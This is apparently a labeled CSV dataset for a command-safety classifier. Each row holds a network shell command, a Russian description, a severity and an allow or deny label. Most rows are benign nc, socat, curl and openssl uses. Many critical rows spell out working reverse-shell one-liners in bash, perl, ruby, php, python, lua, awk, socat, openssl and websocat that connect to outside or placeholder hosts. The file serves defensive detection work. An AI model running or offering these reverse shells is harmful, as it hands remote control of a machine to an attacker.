+/bin/bash -i 5<> /dev/tcp/198.51.100.52/4444 0<&5 1>&5 2>&5,Открывает двунаправленный TCP-сокет на явном файловом дескрипторе и подключает к нему потоки Bash.,bash,critical,CAT-5,CAT-5.2,real,-,deny
+exec 5<>/dev/tcp/198.51.100.52/4444;cat <&5 | while read line; do $line 2>&5 >&5; done,"Читает команды из исходящего TCP-соединения и исполняет их, отправляя вывод обратно в сокет.",bash,critical,CAT-5,CAT-5.2,real,-,deny
+"export RHOST=""10.0.0.1""; export RPORT=""4242""; export PSK=""c2104d74465618a4117135bf76a457d8978b02bccc722a0490f7eb5cc16160f8f04c4b224494fe1453390b4474bd3253""; export PIPE=""/tmp/`openssl rand -hex 4`""; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE",Подключает оболочку к исходящему TLS-PSK-соединению OpenSSL через именованный канал для удалённого управления.,openssl,critical,CAT-5,CAT-5.2,real,-,deny
+ncat -l 127.0.0.1 4444,Принимает данные Ncat на одном локальном TCP-порту без запуска программ.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat -l 127.0.0.1 4444 < file,Отдаёт обычный несекретный тестовый файл клиенту Ncat без исполнения сетевого ввода.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat -l --keep-open 127.0.0.1 4444 < file,Оставляет Ncat доступным для повторных подключений и передаёт обычный тестовый файл как данные.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat 198.51.100.52 4444 > file,Сохраняет данные одного исходящего соединения Ncat в собственный тестовый файл без запуска.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat -l --broker 127.0.0.1 4444,Обменивается данными между локальными клиентами Ncat в broker-режиме без оболочки.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat -l --ssl 127.0.0.1 4444,Принимает локальное TLS-соединение Ncat без запуска команд по входящим данным.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat -l --allow 192.0.2.10,Принимает данные Ncat только от заданного тестового адреса без запуска команд.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat -l --deny 192.0.2.10,Ограничивает адреса клиентов Ncat без исполнения принимаемых данных.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat -l --chat 127.0.0.1 4444,Организует локальный обмен сообщениями Ncat без исполнения текста участников.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+nc <fixture.txt -l -p 4444,Передаёт обычный тестовый файл через слушающий netcat без запуска получаемого текста.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc example.com 4444 >received.txt,Сохраняет данные одного исходящего соединения netcat в обычный тестовый файл без запуска.,nc,low,CAT-5,CAT-5.2,real,-,allow
+"echo -e ""GET / HTTP/1.1\nHost: example.com\n\n"" | nc example.com 80",Передаёт фиксированный HTTP GET через netcat и принимает ответ как данные.,nc,low,CAT-5,CAT-5.2,real,-,allow
+telnet example.com,Открывает Telnet к стандартному порту одного сервиса без локального исполнителя сетевого ввода.,telnet,low,CAT-5,CAT-5.2,real,-,allow
+telnet 198.51.100.52 4444,Открывает Telnet к одному заданному адресу и порту без локальной оболочки.,telnet,low,CAT-5,CAT-5.2,real,-,allow
+telnet -e x 198.51.100.52 4444,Обменивается данными Telnet с заданным escape-символом без исполнения сетевых команд на локальной машине.,telnet,low,CAT-5,CAT-5.2,real,-,allow
+openssl s_client -connect example.com:4444 2>/dev/null | openssl x509 -noout -dates,Получает TLS-сертификат одного сервера и выводит даты его действия без исполнения сетевого ответа.,openssl,low,CAT-5,CAT-5.2,real,-,allow
+openssl </dev/null s_client -connect example.com:4444,Открывает TLS-соединение OpenSSL с пустым stdin и выводит ответ как данные.,openssl,low,CAT-5,CAT-5.2,real,-,allow
+openssl s_client -connect example.com:4444 -servername example.com,Проверяет TLS-соединение с явным SNI без запуска полученных данных.,openssl,low,CAT-5,CAT-5.2,real,-,allow
+openssl </dev/null s_client -connect example.com:443 -showcerts,Получает и выводит цепочку TLS-сертификатов одного сервера без исполнения сетевого ответа.,openssl,low,CAT-5,CAT-5.2,real,-,allow
+curl -X POST -d 'name=bob' http://example.com/form,Отправляет фиксированное несекретное демонстрационное поле разрешённому тестовому HTTP-обработчику.,curl,low,CAT-5,CAT-5.2,real,-,allow
+"curl -d '{""name"":""bob""}' -H 'Content-Type: application/json' http://example.com/users/1234",Передаёт фиксированный демонстрационный JSON разрешённому тестовому обработчику без исполнения ответа.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl -v --resolve example.com:80:127.0.0.1 http://example.com,Запрашивает тестовый HTTP-сервис с явной привязкой домена к loopback без запуска ответа.,curl,low,CAT-5,CAT-5.2,real,-,allow
+"socat -d -d  READLINE,history=$HOME/.http_history \
+TCP4:www.domain.org:www,crnl",Обменивается HTTP-данными через READLINE и socat с преобразованием строк без исполнения сетевого ввода.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat -,escape=0x0f /dev/ttyS0,rawer,crnl",Обменивается данными с собственным тестовым последовательным устройством без интерпретации входа оболочкой.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat -u TCP4-LISTEN:3334,reuseaddr,fork \
+OPEN:/tmp/in.log,creat,append",Принимает TCP-данные в собственный несекретный тестовый журнал с дописыванием без запуска текста.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - SSL:server:4443,cafile=server.crt,cert=client.pem","Обменивается данными с одним TLS-сервисом socat, используя тестовые сертификаты, без исполнения входа.",socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat OPENSSL-LISTEN:4443,reuseaddr,pf=ip4,fork,cert=server.pem,cafile=client.crt PIPE",Возвращает полученные TLS-данные через локальный PIPE socat без исполнения содержимого.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - tcp:www.blackhat.org:31337,readbytes=1000",Получает ограниченный объём данных из одного TCP-соединения без запуска оболочки.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"echo ""Hello Multicast"" | socat - UDP4-DATAGRAM:224.0.0.1:5000",Отправляет одно фиксированное несекретное сообщение в разрешённую тестовую multicast-группу без исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat - UDP4-RECVFROM:5000,Принимает UDP-данные на одном тестовом порту и выводит их без исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+curl -I https://example.com/,Запрашивает только HTTP-заголовки публичного тестового ресурса без исполнения ответа.,curl,low,CAT-5,CAT-5.2,real,-,allow
+ncat 198.51.100.52 4444 --ssl -e /bin/bash,Запускает локальную оболочку с потоками исходящего TLS-соединения Ncat.,ncat,critical,CAT-5,CAT-5.2,real,-,deny
+"cgb_var1=4444;awk -v cgb_var2=""$cgb_var1"" 'BEGIN{cgb_var3=""/inet/udp/0/198.51.100.52/""cgb_var2;while(1){do{printf ""shell>""|&cgb_var3;cgb_var3|& getline cgb_var4;if(cgb_var4){while((cgb_var4|& getline)>0)print $0|&cgb_var3;close(cgb_var4);}}while(cgb_var4!=""exit"")close(cgb_var3);break}}' /dev/null",Исполняет полученные по UDP команды через сопроцесс GNU Awk и возвращает их вывод.,awk,critical,CAT-5,CAT-5.2,real,-,deny
+"perl -MIO::Socket::INET -e '$|=1;$s = new IO::Socket::INET(PeerAddr => ""198.51.100.52:"".4444,Proto => ""udp"");while(1){$s->send(""shell>"");$s->recv($d,1024);$v1=$s->peerhost();$v2=$s->peerport();$v3=qx($d);$s->send($v3);}'","Получает по UDP текст команд, исполняет его Perl и возвращает результат удалённой стороне.",perl,critical,CAT-5,CAT-5.2,real,-,deny
+if [ -e /tmp/cgb_var1 ];then rm /tmp/cgb_var1;fi;mkfifo /tmp/cgb_var1;cat /tmp/cgb_var1|/bin/sh -i 2>&1|nc 198.51.100.52 4444 > /tmp/cgb_var1,Создаёт FIFO после проверки старого файла и соединяет оболочку с исходящим netcat.,nc,critical,CAT-5,CAT-5.2,real,-,deny
+if [ -e /tmp/cgb_var1 ];then rm -f /tmp/cgb_var1;fi;mknod /tmp/cgb_var1 p && nc 198.51.100.52 4444 0</tmp/cgb_var1|/bin/bash 1>/tmp/cgb_var1,Создаёт именованный канал через mknod и связывает Bash с исходящим netcat.,nc,critical,CAT-5,CAT-5.2,real,-,deny
+if [ -e /tmp/cgb_var1 ];then rm /tmp/cgb_var1;fi;mkfifo /tmp/cgb_var1;cat /tmp/cgb_var1|/bin/sh -i 2>&1|telnet 198.51.100.52 4444 > /tmp/cgb_var1,Связывает оболочку с исходящим Telnet через создаваемый именованный канал.,telnet,critical,CAT-5,CAT-5.2,real,-,deny
+"ruby -rsocket -e ""exit if fork;s=TCPSocket.new('198.51.100.52',4444);while(s.print 'shell>';s2=s.gets);IO.popen(s2,'r'){|s3|s.print s3.read}end""","Читает команды из исходящего TCP-сокета Ruby, исполняет их и отправляет вывод обратно.",ruby,critical,CAT-5,CAT-5.2,real,-,deny
+"php -r '$sock=fsockopen(""198.51.100.52"",4444);passthru(""/bin/bash <&3 >&3 2>&3"");'",Запускает оболочку через PHP passthru на дескрипторе исходящего сокета.,php,critical,CAT-5,CAT-5.2,real,-,deny
+"php -r '$sock=fsockopen(""198.51.100.52"",4444);shell_exec(""/bin/bash <&3 >&3 2>&3"");'",Запускает оболочку через PHP shell_exec на дескрипторе исходящего сокета.,php,critical,CAT-5,CAT-5.2,real,-,deny
+"php -r '$sock=fsockopen(""198.51.100.52"",4444);popen(""/bin/bash <&3 >&3 2>&3"", ""r"");'",Открывает процесс оболочки через PHP popen с перенаправлением потоков в исходящий сокет.,php,critical,CAT-5,CAT-5.2,real,-,deny
+"export RHOST=""198.51.100.52"";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/bash"")'",Передаёт потоки PTY внешнему TCP-соединению Python с адресом из переменных окружения.,python,critical,CAT-5,CAT-5.2,real,-,deny
+"lua -e ""require('socket');require('os');t=socket.tcp();t:connect('198.51.100.52','4444');os.execute('/bin/bash -i <&3 >&3 2>&3');""",Запускает оболочку Lua с потоками на дескрипторе исходящего TCP-сокета.,lua,critical,CAT-5,CAT-5.2,real,-,deny
+socat TCP:evil:4444 SYSTEM:/bin/sh,Подключает потоки локальной оболочки SYSTEM к исходящему TCP-соединению socat.,socat,critical,CAT-5,CAT-5.2,real,-,deny
+exec 3>/dev/tcp/evil.example/4444; socat FD:3 EXEC:/bin/sh,Открывает исходящий сокет Bash и передаёт его socat для управления локальной оболочкой.,socat,critical,CAT-5,CAT-5.2,real,-,deny
+"python3 -c 'import socket; socket.create_connection((""www.google.com"", 80))'",Открывает одно TCP-соединение Python без запуска процесса или исполнения сетевого ввода.,python3,low,CAT-5,CAT-5.2,real,-,allow
+"python3 -c 'import socket; socket.gethostbyname(""www.google.com"")'",Разрешает одно публичное доменное имя через Python без запуска оболочки.,python3,low,CAT-5,CAT-5.2,real,-,allow
+"export MOODLE_DB_HOST=198.51.100.52 MOODLE_DB_PORT=4444; php -r ""is_resource(@fsockopen(\""${MOODLE_DB_HOST}\"",intval(\""${MOODLE_DB_PORT}\"")))?exit(0):exit(1);""",Проверяет один TCP-порт через PHP fsockopen и возвращает только код состояния.,php,low,CAT-5,CAT-5.2,real,-,allow
+python -c  'import socket; print(socket.gethostname()); print(socket.getfqdn());',Выводит имя локальной машины и её FQDN через Python без исполнения сетевых данных.,python,low,CAT-5,CAT-5.2,real,-,allow
+telnet canyouseeme.org 81,Подключает Telnet к одному внешнему порту без запуска локальной оболочки.,telnet,low,CAT-5,CAT-5.2,real,-,allow
+ncat --listen --sh-exec='env -u X cat' 4444,Обрабатывает входящие данные фиксированным cat через Ncat; сетевой текст не становится программой.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat --listen --exec='nice -n 5 cat' 4444,Запускает фиксированный cat с изменённым приоритетом для обработки данных Ncat.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+ncat --listen --sh-exec='printf ok' 4444,Запускает фиксированную команду printf в Ncat без интерпретации текста клиента.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+socat TCP-LISTEN:4444 SYSTEM:id,"Отправляет клиенту вывод фиксированной команды id, не исполняя получаемые данные.",socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 CREAT:received.bin",Принимает TLS-данные в обычный тестовый файл без их исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 STDOUT",Выводит принятые TLS-данные в stdout без их исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat OPENSSL:example.com:443 STDIO,Обменивается данными с одним TLS-сервисом через стандартные потоки без запуска команд.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat TCP-LISTEN:4444,reuseaddr,fork STDOUT",Выводит данные TCP-клиентов в stdout; fork не передаёт управление оболочкой.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat OPENSSL-LISTEN:4444,cert=server.pem,openssl-verify=0,min-proto-version=TLS1.2 STDOUT",Принимает TLS-данные с заданной минимальной версией протокола и выводит их без исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat TCP-LISTEN:4444,bind=127.0.0.1:4444 STDOUT",Принимает данные на loopback-адресе и выводит их в stdout.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat TCP6-LISTEN:4444,bind=[::1]:4444 STDOUT",Принимает данные на IPv6 loopback-адресе без исполнения сетевого ввода.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat TCP-LISTEN:4444,fork,range=10.0.0.0/8 STDOUT",Принимает данные только из разрешённой сети и выводит их без исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat TCP-LISTEN:4444,fork,tcpwrap=socat STDOUT",Принимает данные с проверкой TCP Wrappers и передаёт их только в stdout.,socat,low,CAT-5,CAT-5.2,real,-,allow
+mkfifo /tmp/c1c-fifo; cat /tmp/c1c-fifo | cat | nc evil.example 4444 > /tmp/c1c-fifo,"Соединяет FIFO, фиксированный cat и netcat без оболочки, исполняющей входящие данные.",nc,low,CAT-5,CAT-5.2,real,-,allow
+mkfifo /tmp/c1c-fifo; cat /tmp/c1c-fifo | sort | nc evil.example 4444 > /tmp/c1c-fifo,Передаёт данные через FIFO и sort в netcat без исполнения получаемого текста.,nc,low,CAT-5,CAT-5.2,real,-,allow
+"python3 -c 'import socket;s=socket.socket();s.connect((""evil.example"",4444));s.sendall(b""ping"")'",Отправляет фиксированное сообщение ping в один TCP-сокет без запуска команд.,python3,low,CAT-5,CAT-5.2,real,-,allow
+"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""evil.example"",4444));os.dup2(s.fileno(),0);subprocess.call([""/bin/sh"",""-c"",""id""])'","Открывает сокет и запускает только фиксированную команду id, не передавая сетевой ввод интерпретатору.",python3,low,CAT-5,CAT-5.2,real,-,allow
+echo hello > /dev/tcp/evil.example/4444,Отправляет фиксированное сообщение через TCP-перенаправление Bash без чтения команд из сети.,bash,low,CAT-5,CAT-5.2,real,-,allow
+socat PIPE -,Возвращает данные через локальный pipe без исполнения их содержимого.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat \
+	READLINE \
+	/dev/ttyS0,raw,echo=0,crlf",Обменивается данными с тестовым последовательным устройством без запуска оболочки.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - /tmp/hugo,trunc,ignoreeof!!/tmp/hugo",Обменивается данными с обычным временным тестовым файлом без исполнения содержимого.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat - /tmp/postoffice,Подключается к разрешённому локальному Unix-сокету для обмена данными.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat -d -d -t 3600 - tcp:proxy:8080,crlf",Открывает одно TCP-соединение с преобразованием строк и таймаутом без исполнения входящих данных.,socat,low,CAT-5,CAT-5.2,real,-,allow
+"socat - FILE:/tmp/outfile1,ignoreeof!!FILE:/tmp/outfile1,append",Передаёт данные через собственный обычный тестовый файл с дописыванием без исполнения.,socat,low,CAT-5,CAT-5.2,real,-,allow
+export HOST=198.51.100.52 PORT=4444; exec 3> /dev/tcp/${HOST}/${PORT},"Открывает исходящий TCP-дескриптор Bash, не связывая его с интерпретатором.",bash,low,CAT-5,CAT-5.2,real,-,allow
+"timeout --preserve-status 2 bash -c ""</dev/tcp/canyouseeme.org/81""; echo $?",Проверяет один TCP-порт Bash с сохранением статуса таймаута без удалённого исполнения.,bash,low,CAT-5,CAT-5.2,real,-,allow
+export HOST=198.51.100.52 PORT=4444 TIMEOUT_SECONDS=2; nc -w $TIMEOUT_SECONDS -v $HOST $PORT </dev/null; echo $?,Проверяет подключение к одному порту netcat с пустым stdin и выводит код состояния.,nc,low,CAT-5,CAT-5.2,real,-,allow
+nc -n -w 1 --send-only 198.51.100.52 4444 </dev/null,Открывает одно соединение Ncat под именем nc без DNS и отправки stdin; удалённые команды не исполняет.,nc,low,CAT-5,CAT-5.2,real,-,allow
+"export port=4444; nc -w 2 -i 1 localhost ""$port"" 2>&1 | grep -v -q 'Idle timeout expired'",Проверяет один локальный порт Ncat и фильтрует диагностическое сообщение таймаута.,nc,low,CAT-5,CAT-5.2,real,-,allow
+"nc -zw 2 examplehost.com 22 && { echo ""You can call your backup function"" ; } || { echo ""SSH Unavailable"" ; }",Проверяет один SSH-порт и печатает фиксированное сообщение об успехе или недоступности.,nc,low,CAT-5,CAT-5.2,real,-,allow
+socat /dev/null tcp4:198.51.100.52:4444,Подключается к одному TCP-порту socat с пустым вводом без запуска оболочки.,socat,low,CAT-5,CAT-5.2,real,-,allow
+socat /dev/null tcp4:198.51.100.52:4444 > /dev/null 2>&1 ; echo $?,"Проверяет один TCP-порт socat, подавляет диагностический вывод и выводит код состояния.",socat,low,CAT-5,CAT-5.2,real,-,allow
+C='curl -Ns telnet://198.51.100.52:4444'; $C </dev/null 2>&1 | /bin/bash 2>&1 | $C >/dev/null,Связывает ввод и вывод Bash с двумя исходящими Telnet-соединениями curl для удалённого управления.,curl,critical,CAT-5,CAT-5.2,real,-,deny
+"openssl s_client -brief -starttls smtp \
+  -connect smtp.example.com:25 \
+  -dane_tlsa_domain smtp.example.com \
+  -dane_tlsa_rrdata ""2 1 1
+    B111DD8A1C2091A89BD4FD60C57F0716CCE50FEEFF8137CDBEE0326E 02CF362B"" \
+  -dane_tlsa_rrdata ""2 1 1
+    60B87575447DCBA2A36B7D11AC09FB24A9DB406FEE12D2CC90180517 616E8A18""",Проверяет SMTP TLS-сервис по DANE TLSA без запуска полученных данных.,openssl,low,CAT-5,CAT-5.2,real,-,allow
+curl https://www.example.com/,Получает публичную HTTPS-страницу как данные без её исполнения.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl ftp://ftp.example.com/README,Получает публичный README по FTP без исполнения содержимого.,curl,low,CAT-5,CAT-5.2,real,-,allow
+"curl ""http://[2001:1890:1112:1::20]/""",Получает HTTP-страницу с одного IPv6-узла без исполнения содержимого.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl -o thatpage.html https://www.example.com/,Сохраняет публичную HTTPS-страницу в обычный тестовый файл без запуска.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl -r 0-99 https://www.example.com/,Получает первые сто байтов публичного HTTP-ресурса без исполнения.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl -r -500 https://www.example.com/,Получает последние пятьсот байтов публичного ресурса без исполнения.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl -r 0-99 ftp://www.example.com/README,Получает диапазон байтов публичного README по FTP без исполнения.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl -e www.example.org https://www.example.com/,Запрашивает HTTPS-страницу с фиксированным Referer без исполнения ответа.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl --dump-header headers www.example.com,Сохраняет заголовки HTTP-ответа в собственный тестовый файл без исполнения.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl --limit-rate 10K www.far-away.example.com,Получает публичную страницу с ограничением скорости без исполнения.,curl,low,CAT-5,CAT-5.2,real,-,allow
+"curl -H ""X-you-and-me: yes"" love.example.com",Посылает фиксированный HTTP-заголовок и получает ответ как данные.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl -z local.html https://remote.example.com/remote.html,Получает ресурс только при изменении относительно времени обычного локального тестового файла.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl -w 'We downloaded %{size_download} bytes\n' www.example.com,Получает публичную страницу и выводит размер передачи без запуска сетевых данных.,curl,low,CAT-5,CAT-5.2,real,-,allow
+curl telnet://remote.example.com,"Открывает одно Telnet-соединение curl без локальной оболочки, исполняющей сетевой ввод.",curl,low,CAT-5,CAT-5.2,real,-,allow
+curl -tTTYPE=vt100 telnet://remote.example.com,Открывает Telnet-соединение с фиксированным типом терминала без исполнения сетевых данных.,curl,low,CAT-5,CAT-5.2,real,-,allow
+ncat --listen --exec=/bin/cat 4444,Принимает соединение Ncat и передаёт данные фиксированному cat без исполнения текста клиента.,ncat,low,CAT-5,CAT-5.2,real,-,allow
+"./websocat -b ws://yourserverurl:8000 exec:socat --exec-args - exec:""bash -li"",pty,stderr,setsid,sigint,sane",Соединяет исходящий WebSocket с локальным Bash через socat и PTY для удалённого управления.,websocat,critical,CAT-5,CAT-5.2,real,-,deny
